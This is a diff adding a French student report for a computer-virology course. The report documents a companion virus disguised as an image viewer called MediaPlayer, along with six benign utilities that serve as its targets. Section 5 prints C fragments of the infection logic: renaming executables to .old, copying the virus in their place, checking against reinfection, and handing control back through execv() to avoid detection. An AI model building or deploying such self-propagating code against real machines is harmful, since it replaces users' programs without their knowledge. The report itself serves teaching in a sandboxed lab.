@@ -29,14 +29,158 @@
 <div style="page-break-after: always;"></div>
 
 ### 1. Introduction
+Dans le cadre de ce cours de virologie informatique, nous avons du développer un virus de type compagnon, il se substitue donc aux fichiers exécutables à son niveau et les renomme pour pouvoir leur rendre la main afin d'éviter d'éveiller les soupçons de l'utilisateur. Pour ce faire, nous avons du développer 6 utilitaires qui permettront de jouer les victimes lors de l'infection.
+
+L'utilisateur n'étant pas un professionnel de la sécurité, le virus se situe dans un lecteur d'images (mediaplayer) avec un dossier d'images permettant de l'inciter à l'utiliser.
+
+Pour ce qui est du partage des tâches, avec mon binôme nous avons chacun fait de tout, que ce soit les utilitaires et le virus en lui même.
 
 <div style="page-break-after: always;"></div>
 
 ### 2. Environnement de travail et Outils de développement
 
+#### 2.1 Environnement système
+- **Système d'exploitation :** Comme demandé dans le sujet, nous avons utilisé Linux.
+- **Compilateur :** GCC avec options `-Wall` pour avoir tous les warnings lors du développement
+
+#### 2.2 Outils de compilation et de build
+- **CMake 3.31+** : Système de compilation utilisé pour gérer les dépendances et la compilation
+- **CMake Presets** : Configuration pour les builds Debug et Release (faits par Axel)
+    - Répertoire binaire : `build/debug/`
+    - Répertoire d'installation : `install/debug/`
+    - Plus lente mais affiche les erreurs, les variables ...
+  - **Release** : Compilation optimisée
+    - Répertoire binaire : `build/release/`
+    - Répertoire d'installation : `install/release/`
+    - Plus rapide, sans outils de debug
+
+#### 2.3 Dépendances requises
+Le projet utilise plusieurs bibliothèques système :
+- **OpenSSL** : Pour l'utilitaire de hachage (hachage SHA256)
+- **GLib 2.0** : Structurations des données
+- **GIO 2.0** : Manipulation de fichiers et répertoires
+- **GTK 4** : Framework GUI pour l'interface graphique du MediaPlayer
+- **GD** : Manipulation et traitement d'images (inversion de couleurs et distorsion)
+- **PkgConfig** : Gestion des dépendances
+
+#### 2.4 Structure de développement
+```
+companion-virus/
+├── CMakeLists.txt          # Configuration CMake principale
+├── CMakePresets.json       # Presets de compilation (debug/release)
+├── setup_test_env.sh       # Script de préparation de l'environnement de test
+├── assets/                 # Images de test pour le MediaPlayer
+├── include/                # En-têtes avec interfaces publiques
+│   ├── virus/
+│   ├── utils/
+│   └── common/
+└── src/                    # Code source organisé par module
+    ├── virus/              # Virus compagnon (MediaPlayer)
+    ├── utils/              # 6 utilitaires (séparation de l'ui et de la logique métier pour chacun)
+    └── common/             # Fonctions communes (GUI utils)
+```
+
+#### 2.5 Compilation et Installation
+
+**Étape 1 : Installation des dépendances**
+```bash
+sudo apt-get install gcc cmake libssl-dev libglib2.0-dev \
+  libgio-2.0-dev libgtk-4-dev libgd-dev
+```
+
+**Étape 2 : Configuration avec CMake Presets**
+```bash
+cmake --preset=release
+```
+
+**Étape 3 : Compilation**
+```bash
+cmake --build --preset=release
+```
+
+**Étape 4 : Préparation de l'environnement de test**
+```bash
+bash setup_test_env.sh
+```
+Ce script crée un répertoire `build/home/user1/` simulant le répertoire donné dans les consignes :
+- Un dossier `images/` contenant les medias du projet
+- Les exécutables compilés (virus + 6 utilitaires)
+- Les permissions appropriées (exécution pour le propriétaire et le groupe, lecture écriture pour le groupe)
+
+#### 2.6 Outils de test et validation
+- **CMake CTest** : Framework intégré pour l'exécution des tests
+- **Environnement home/user1** : Répertoire isolé permettant de tester le virus compagnon sans risques
+- **Validation manuelle** : Inspection des fichiers `.old` pour vérifier l'infection et propagation
+
 <div style="page-break-after: always;"></div>
 
 ### 3. Architecture globale du projet
+
+#### 3.1 Vue d'ensemble modulaire
+
+Le projet est structuré selon une architecture en trois couches :
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│             Virus Compagnon (MediaPlayer)                   │
+│  - Détection des fichiers exécutables pour infection        │
+│  - Vérification contre la sur-infection (double check)      │
+│  - Propagation par duplication + renommage                  │
+│  - Interface GUI pour le "service" (affichage d'images)     │
+└──────────────────────┬──────────────────────────────────────┘
+                       │
+                       │ Appelle les utilitaires infectés
+                       ▼
+┌─────────────────────────────────────────────────────────────┐
+│        Utilitaires (6 exécutables indépendants)              │
+│  - Base Converter    : Conversions de bases numériques       │
+│  - Caesar Encrypt    : Chiffrement par décalage              │
+│  - File Hasher       : Hachage SHA256 de fichiers            │
+│  - Image Inverter    : Inversion de couleurs d'images        │
+│  - Num Generator     : Génération de nombres aléatoires      │
+│  - Temp Converter    : Conversions de températures           │
+└──────────────────────┬──────────────────────────────────────┘
+                       │
+                       │ Utilisent les fonctions communes
+                       ▼
+┌─────────────────────────────────────────────────────────────┐
+│      Couche Commune (Fonctions partagées)                    │
+│  - Utilitaires GUI   : Éléments graphiques      │
+│  - Gestion mémoire   : Allocation/libération de ressources   │
+│  - Dépendances sys   : GTK4, GLib, OpenSSL, GD              │
+└─────────────────────────────────────────────────────────────┘
+```
+
+#### 3.2 Organisation modulaire des utilitaires
+
+Chaque utilitaire possède la même structure pour faciliter le développement et la compréhension :
+
+```
+utilitaire/
+├── core.c           # Logique métier (calculs etc...)
+├── ui.c             # Interface utilisateur GTK4
+└── header.h         # Interface publique exposée
+```
+
+#### 3.3 Structure générale
+
+Le projet est composé de :
+- **6 utilitaires** : cibles de la future infection, plus ou moins en lien avec la sécurité (file_hasher, img_inverter, caesar_encrypt)
+- **1 virus compagnon** (MediaPlayer) : virus principal, sert à l'infection et de propagation, affiche des images.
+- **Couche commune** : Fonctions partagées pour la GUI et utilitaires système
+
+#### 3.4 Interactions et dépendances
+
+| Module | Dépend de | Utilisé par |
+|--------|-----------|-------------|
+| Virus | common (gui_utils) | Infecte les autres modules |
+| Base Converter | common | Utilisateurs / Virus |
+| Caesar Encrypt | common | Utilisateurs / Virus |
+| File Hasher | common + OpenSSL | Utilisateurs / Virus |
+| Image Inverter | common + GD | Utilisateurs / Virus |
+| Num Generator | common | Utilisateurs / Virus |
+| Temp Converter | common | Utilisateurs / Virus |
+| Common | GTK4, GLib, GIO | Tous les modules |
 
 <div style="page-break-after: always;"></div>
 
@@ -44,19 +188,251 @@
 
 #### 4.1 Sécurité et Cryptographie : Caesar Encrypt & File Hasher
 
+##### Caesar Encrypt - Chiffrement par décalage
+
+Utilitaire de chiffrement simple basé sur le chiffre de César (décalage de lettres alphabétiques).
+
+**Fonctionnalités :**
+- Chiffrement/déchiffrement de chaînes texte avec décalage paramétrable (0-25)
+- Chiffrement de fichiers par relecture et réécriture
+- Conservation des caractères non-alphabétiques (chiffres, ponctuation)
+
+**Implémentation :**
+- Fonction cœur : `caesar_cipher_char(shift, character)` - applique le décalage circulaire modulo 26
+- Extraction en fichier des résultats
+- Interface GUI pour saisie du décalage et sélection du fichier
+
+---
+
+##### File Hasher - Générateur de hash SHA256
+
+Utilitaire de hachage cryptographique utilisant l'algorithme SHA256.
+
+**Fonctionnalités :**
+- Calcul du hash SHA256 d'un fichier
+- Hashage de buffers mémoire
+- Affichage du hash en format hexadécimal (64 caractères)
+- Vérification d'intégrité de fichiers
+
+**Implémentation :**
+- Utilise OpenSSL (`libssl-dev`)
+
+**Application :** Vérification d'intégrité, détection de fichiers modifiés, empreinte numérique
+
+<div style="page-break-after: always;"></div>
+
 #### 4.2 Traitement de données et conversions : Base Converter & Num Generator & Temp Converter
 
+##### Base Converter - Convertisseur de bases numériques
+
+Convertisseur entre différentes bases numériques (binaire, octal, décimal, hexadécimal, et jusqu'à base 36).
+
+**Fonctionnalités :**
+- Conversion décimal → base N (2-36)
+- Conversion base N → décimal
+- Support bases courantes : binaire (2), octal (8), décimal (10), hexadécimal (16)
+- Calcul automatique de la taille nécessaire pour le résultat
+
+**Implémentation :**
+- Algorithme de conversion : divisions répétées avec accumulation
+- Représentation des chiffres > 9 par lettres (A-Z pour 10-35)
+- Gestion des nombres négatifs
+
+---
+
+##### Num Generator - Générateur de nombres aléatoires
+
+Générateur de nombres pseudo-aléatoires configurable.
+
+**Fonctionnalités :**
+- Génération de nombres aléatoires dans une plage [min, max]
+- Génération de floats normalisés [0.0, 1.0]
+- Configuration de la graine (seed) pour reproductibilité
+
+**Implémentation :**
+- Utilise `srand()` et `rand()` du C standard
+- Interface pour contrôler iterations et graine
+
+**Application :** tests statistiques, données de test aléatoires
+
+---
+
+##### Temp Converter - Convertisseur de températures
+
+Convertisseur de températures entre les trois grandes échelles (Kelvin, Celsius, Fahrenheit)
+
+**Fonctionnalités :**
+- Conversion bidirectionnelle Celsius ↔ Fahrenheit
+- Conversion bidirectionnelle Celsius ↔ Kelvin
+- Conversion bidirectionnelle Fahrenheit ↔ Kelvin
+- Affichage instantané de toutes les conversions
+
+**Formules implémentées :**
+- C → F : `(C × 9/5) + 32`
+- F → C : `(F - 32) × 5/9`
+- C → K : `C + 273.15`
+- K → C : `K - 273.15`
+
+<div style="page-break-after: always;"></div>
+
 #### 4.3 Manipulation d'images et stéganographie : Image Inverter
+
+##### Image Inverter - Inverseur de couleurs d'images
+
+Utilitaire de traitement d'image basique : inversion des couleurs RGB.
+Légère distorsion de l'image
+
+**Fonctionnalités :**
+- Lecture d'image (formats multiples grâce à GD)
+- Inversion de chaque pixel : `RGB → (255-R, 255-G, 255-B)`
+- Écriture du résultat dans nouveau fichier
+- Traitement pixel par pixel, conservation des dimensions
+
+**Implémentation :**
+- Utilise la bibliothèque GD (`libgd-dev`) pour manipulation des images
+- Itération double boucle sur width × height
+- Calcul d'inversion pour chaque composante couleur
+- Décalage des pixels avec un offset pour effet de distorsion
+
+**Cas d'usage :** Effets graphiques, traitement photo basique, stéganographie
 
 <div style="page-break-after: always;"></div>
 
 ### 5. Conception du Virus Compagnon (MediaPlayer)
 
+Le virus compagnon est un virus qui se substitue aux utilitaires en renommant les fichiers cibles avec l'extension '.old'. Son nom "MediaPlayer" correspond à sa charge utile (affichage d'images), masquant sa véritable nature virale.
+
 #### 5.1 Mécanisme de primo-infection
+
+**Détection et identification du virus lui-même**
+
+Lors du premier lancement, le virus doit identifier s'il est lui-même une copie infectée ou l'original. Pour cela :
+
+```c
+char *exe = getExec();  // Récupère le chemin complet du binaire en exécution
+if (!g_str_has_suffix(exe, ".old")) { // Regarde si le fichier est déja infecté avec le .old
+    
+    mediaplayer_scan_folder(folder, state);      // Scanne les exécutables à son niveau
+    mediaplayer_verify_files(state);              // Lance l'infection
+}
+```
+
+**Processus d'infection**
+
+Lors de la primo-infection:
+
+1. **`mediaplayer_scan_folder(folder, state)`** : Analyse le répertoire courant
+   - Utilise GLib's `g_dir_open()` pour énumérer les fichiers
+   - Teste chaque fichier avec `S_ISREG` (fichier régulier) et `X_OK` (exécutable)
+   - Construit une liste chaînée (GList) des cibles potentielles
+
+2. **`mediaplayer_verify_files(state)`** : Applique les vérifications de sécurité
+
+3. **Infection** : Pour chaque cible valide, copie du virus sous le nom de la cible
+
+---
 
 #### 5.2 Stratégie de propagation et lutte contre la sur-infection
 
+**Double vérification**
+
+Le virus évolue dans un contexte où il crée lui-même de nouveaux fichiers. Sans protection, il infecterait les mêmes fichiers à répétition (risque de corruption). Pour cela nous avons implémenté les mécanismes de vérification.
+
+**première vérification : Fichier `.old`**
+
+```c
+if (g_str_has_suffix(file, ".old")) {
+    return;  // Ce fichier est déjà infecté, on n'y touche plus
+}
+```
+
+**Deuxième vérification : Homologue `.old` existant**
+
+```c
+char *old_exec = g_strconcat(file, ".old", NULL);
+if (g_file_test(old_exec, G_FILE_TEST_EXISTS | G_FILE_TEST_IS_EXECUTABLE)) {
+    return;  // Le fichier `.old` existe déjà, donc le virus a déjà infecté cette cible
+}
+```
+
+**Processus d'infection après vérification**
+
+Si les deux vérifications passent :
+
+```c
+if (rename(file, old_exec) == 0) {           // 1. Renomme original en .old
+    if (mediaplayer_dup(old_exec) != 0) {    // 2. Copie le virus
+        rename(old_exec, file);               // 3. si échec, on lui rend son nom original
+    }
+}
+```
+
+Cette séquence garantit :
+- L'intégrité du fichier original (présent en `.old`)
+- La conservation des droits d'exécution (la copie hérite des permissions)
+
+**Exemple pratique :**
+
+Avant infection : `base_converter` (exécutable original)
+Après infection : `base_converter` (copie du virus) + `base_converter.old` (original sauvegardé)
+
+Réinfection tentée : Vérifications 1 & 2 passent → aucune action
+
+---
+
 #### 5.3 Transfert de contrôle (Code Hôte)
+
+**Transparence**
+
+L'utilisateur a lancé ce qu'il pense être `base_converter`. Il doit voir `base_converter` fonctionner. Pour cela nous utilisons `execv()` afin de lancer le programme original.
+
+**Transfert d'exécution par remplacement du processus**
+
+```c
+char *old_exec = g_strconcat(exe, ".old", NULL);  // Ex: "base_converter.old"
+
+if (g_file_test(old_exec, G_FILE_TEST_EXISTS | G_FILE_TEST_IS_EXECUTABLE)) {
+    char *const argv_exec[] = {old_exec, NULL};
+    
+    free_app_data(ad);      // Libère les ressources
+    g_free(exe);
+    
+    execv(old_exec, argv_exec);  // donne la main au programme demandé par l'utilisateur à la base.
+    exit(EXIT_FAILURE);
+}
+```
+
+**Comportement de l'utilitaire infecté**
+
+```
+1. Utilisateur lance base_converter
+                    ↓
+2. Système exécute base_converter (copie du virus)
+                    ↓
+3. Le base_converter infecté recherche de potentielles nouvelles cibles dans le répertoire
+                    ↓
+4. Les nouvelles cibles sont infectées à leur tour 
+                    ↓
+5. execv() remplace le processus → lance base_converter.old
+                    ↓
+6. L'interface du vrai base_converter s'affiche
+                    ↓
+7. Utilisateur utilise le programme normalement
+```
+
+**Invisibilité technique**
+
+- `execv()` remplace le processus
+- Aucune création de processus enfant visible
+- Aucune ligne de trace dans les logs de processus
+
+**Cas limite : Fichier `.old` inexistant**
+
+Si le fichier `.old` n'existe pas ou a été supprimé et que le virus s'exécute sous un nom différent de `MediaPlayer`:
+- Le virus affiche l'interface MediaPlayer
+- À la fermeture, aucun appel `execv()` 
+- L'utilisateur voit MediaPlayer là où il attendait autre chose
+- **Détection confirmée**
 
 <div style="page-break-after: always;"></div>
 
